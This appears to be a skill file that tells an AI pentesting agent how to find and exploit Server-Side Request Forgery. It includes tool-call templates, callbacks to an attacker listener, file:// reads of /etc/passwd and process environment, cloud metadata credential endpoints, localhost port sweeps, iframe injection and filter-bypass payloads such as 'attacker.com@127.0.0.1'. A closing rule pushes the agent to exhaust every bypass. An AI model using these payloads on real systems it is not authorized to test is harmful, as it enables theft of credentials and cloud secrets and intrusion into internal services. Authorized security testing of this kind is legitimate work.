---
name: ssrf
description: Universal methodology for Server-Side Request Forgery discovery and exploitation across URL-fetching features (webhooks, PDF/screenshot converters, image proxies, link previews, import-from-URL, markdown-to-X converters, headless browser rendering pipelines).
---

# SSRF METHODOLOGY

Execute when the target has ANY feature where the server fetches a URL, file, or resource on the user's behalf: webhook config, "import from URL," avatar-from-URL, PDF/document generation, link unfurling, image proxies, RSS/feed readers, or any headless-browser-backed rendering pipeline.

## 1. Identify the Fetch Primitive Before Testing
**CRITICAL RULE:** Do not fire payloads blind. First determine WHAT is doing the fetching.
- Read client-side JS and API docs for hints: `Puppeteer`, `wkhtmltopdf`, `Electron`, `Playwright`, `phantomjs`, or a generic HTTP client library.
- A headless-browser-backed renderer (Puppeteer/Electron/Playwright) means the fetch happens INSIDE a real browser context — HTML tags (`<iframe>`, `<img>`, `<link>`) are viable SSRF vectors, not just raw URL parameters.
- A plain server-side HTTP client (requests/axios/curl-equivalent) means only the primary URL parameter is the vector — HTML injection inside it is irrelevant.

## 2. Confirm the Primitive Works At All (Out-of-Band First)
Before touching internal targets, confirm the fetch is real and outbound-capable:
1. Point the feature at an attacker-controlled listener (`http://<your_ip>:<port>/probe`).
2. Confirm the hit lands in your listener log.
3. Note WHAT got fetched — if it's a `GET` for a file only (not executed), the primitive is read/render-only, not RCE-capable. Do not assume code execution from a confirmed fetch.

```json
{"tool": "curl", "args": {"url": "<target_ssrf_endpoint>", "method": "POST", "json": {"<url_field>": "http://<listener_ip>:<port>/ssrf-probe"}}}
```

## 3. Escalate to Local File Read
Test `file://` scheme support directly in the same field/tag used above:
```
file:///etc/passwd
file:///proc/self/environ
file:///app/config.py
```
- If blocked with a generic error (not a timeout), the scheme is explicitly filtered — try scheme-case variants (`FILE://`), or `file:` without slashes, or wrapping inside an `<iframe src="file://...">` if the primitive is browser-backed.
- If the render succeeds but shows blank/no content, the renderer may sandbox local file access even though the scheme isn't blocked outright — note this as a partial finding, not full LFI.

## 4. Escalate to Internal Network / Cloud Metadata
Once outbound fetch is confirmed, pivot inward:
1. **Cloud metadata endpoints** (test all — target may be on AWS/GCP/Azure/Alibaba):
   - `http://169.254.169.254/latest/meta-data/` (AWS IMDSv1)
   - `http://169.254.169.254/latest/api/token` via `PUT` with `X-aws-ec2-metadata-token-ttl-seconds` header (AWS IMDSv2 — requires PUT support in the primitive, note if unavailable)
   - `http://metadata.google.internal/computeMetadata/v1/` with header `Metadata-Flavor: Google`
   - `http://169.254.169.254/metadata/instance?api-version=2021-02-01` with header `Metadata: true` (Azure)
2. **Internal service discovery**: sweep `127.0.0.1` and `localhost` across common internal ports (`5000`, `8080`, `8000`, `3000`, `9200`, `6379`, `27017`) using the confirmed primitive.
3. If a scan of the same host on a nonstandard port (e.g. `:5000`) 404s or refuses, the service may not be up yet — retry after a short delay; some lab/CI environments provision internal services lazily.

## 5. Fuzz Discovered Internal Routes
If port sweep or JS analysis reveals an internal admin/API path (`/admin`, `/internal`, `/debug`):
1. Directly request it externally first to confirm it's actually blocked from outside (`403`/connection refused expected).
2. Route the SAME request through the confirmed SSRF primitive instead.
3. If the primitive is browser-backed, wrap in `<iframe src="http://127.0.0.1:<port>/<internal_path>">` and inspect the rendered output (screenshot/PDF/HTML) for leaked content.

```json
{"tool": "curl", "args": {"url": "<target_ssrf_endpoint>", "method": "POST", "json": {"<content_field>": "<iframe src=\"http://127.0.0.1:<internal_port>/<internal_path>\"></iframe>"}}}
```

## 6. Bypass Filtering (If Direct `127.0.0.1`/`localhost` Is Blocked)
Try in order, re-testing the out-of-band probe from Step 2 after each:
- Decimal/octal/hex IP encoding: `http://2130706433/`, `http://0177.0.0.1/`, `http://0x7f.0.0.1/`
- IPv6 loopback: `http://[::1]/`
- DNS rebinding via a domain you control that resolves to `127.0.0.1`
- URL parser confusion: `http://attacker.com@127.0.0.1/`, `http://127.0.0.1#@attacker.com/`
- Redirect chaining: host a redirect on your own server (`http://<listener>/redir` → `302 → http://127.0.0.1/admin`) if the fetcher follows redirects but filters only the initial input.

## 7. Verification & Evidence
Do NOT claim SSRF from a bare `200 OK` on the outbound probe alone — that only proves outbound fetch capability, not internal-network reach.
1. **Confirm impact**: the fetched/rendered content must contain something that could ONLY come from an internal-only resource (metadata credentials, an internal admin page's real content, a config file's contents).
2. **Capture visual proof** (gowitness) of the rendered output containing the internal content, or save the raw response body showing leaked data.
3. **Record finding:**
```json
{"tool": "record_finding", "args": {"title": "SSRF via <feature name> Enabling Internal Metadata/Admin Access", "kind": "ssrf", "severity": "critical", "request_ref": "<ssrf_endpoint>", "note": "Server-side fetch primitive reaches internal-only resources (<specific endpoint>); confirmed via <specific leaked content>, not assumed from response code alone."}}
```

## Rule of Exhaustion
A blocked `file://` or blocked `169.254.169.254` does not mean SSRF is dead — re-test every internal target through EVERY bypass in Step 6 before concluding the vector is closed. A primitive that fetches-but-doesn't-execute is still a valid, often critical, finding (internal recon + metadata theft) even with zero code execution.
